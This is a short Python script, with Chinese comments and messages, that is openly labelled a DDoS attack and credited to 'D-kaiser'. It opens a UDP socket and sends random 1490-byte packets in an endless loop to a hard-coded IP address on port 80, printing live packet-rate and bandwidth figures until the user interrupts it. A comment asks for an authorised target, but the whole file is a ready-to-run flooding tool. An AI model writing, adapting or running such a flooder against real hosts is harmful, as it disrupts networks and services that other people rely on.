# -*- coding:UTF-8 -*-
import os
import socket
import time

# 清除屏幕并显示标题
os.system("clear")
os.system("figlet DDos Attack")
ip = "192.168.0.1"      # 请替换为授权目标 IP
port = 80

os.system("clear")
print("什么？流量太多用不完？")
print("D-kaiser帮你打飞流量啦！")
print("攻击正在启动...")
time.sleep(2)
os.system("clear")

# 初始化 socket 和数据
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = os.urandom(1490)

# 统计变量
sent = 0               # 总发送包数
start_time = time.time()
last_time = start_time
last_sent = 0

print("\033[?25l")      # 隐藏光标，使输出更干净

try:
    while True:
        sock.sendto(data, (ip, port))
        sent += 1

        # 每秒更新一次统计
        now = time.time()
        if now - last_time >= 1.0:
            elapsed = int(now - start_time)
            pps = sent - last_sent          # 过去 1 秒发送的包数
            mbps = (pps * 1490 * 8) / 1_000_000   # Mbps
            # ANSI 颜色美化输出：\r 回行首，\033[K 清除行尾
            print(f"\r\033[K\033[1;32m[{elapsed}s]\033[0m "
                  f"总发包: \033[1;33m{sent}\033[0m | "
                  f"速率: \033[1;35m{pps} pps\033[0m | "
                  f"流量: \033[1;36m{mbps:.2f} Mbps\033[0m",
                  end="", flush=True)
            # 更新上一秒的数据
            last_time = now
            last_sent = sent

except KeyboardInterrupt:
    sock.close() # 显式关闭 socket
    print("\033[?25h")
    print("\n\n\033[1;31m攻击已手动停止，Socket 已关闭。\033[0m")